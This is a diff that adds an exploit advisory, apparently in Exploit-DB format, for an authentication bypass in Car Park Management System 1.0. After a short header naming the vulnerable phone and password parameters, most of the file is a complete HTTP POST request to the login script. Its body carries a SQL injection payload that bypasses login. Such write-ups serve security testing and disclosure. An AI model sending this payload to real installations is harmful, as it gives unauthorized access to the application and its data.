@@ -1,0 +1,29 @@
+# Exploit Title: Car Park Management System 1.0 - Authentication Bypass
+# Date: 2020-05-07
+# Exploit Author: Tarun Sehgal
+# Vendor Homepage: https://www.sourcecodester.com/
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/razormist/car-park-management-system.zip
+# Version: 1.0
+# Tested On: Windows 10 Pro 10.0.18363 N/A Build 18363 + XAMPP V3.2.4
+
+---------------------------------------------------------------------------------
+
+#parameter Vulnerable: phone and password
+#Injected Request
+#Below request will allow authentication bypass
+
+POST /Car%20Park%20Management%20System/proc/login.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+Origin: http://localhost
+Connection: close
+Referer: http://localhost/Car%20Park%20Management%20System/
+Cookie: PHPSESSID=d84agc0pp6qihtm7u775ftvukd
+Upgrade-Insecure-Requests: 1
+
+phone=' or '1'='1&password=' or '1'='1&Submit=Log+In
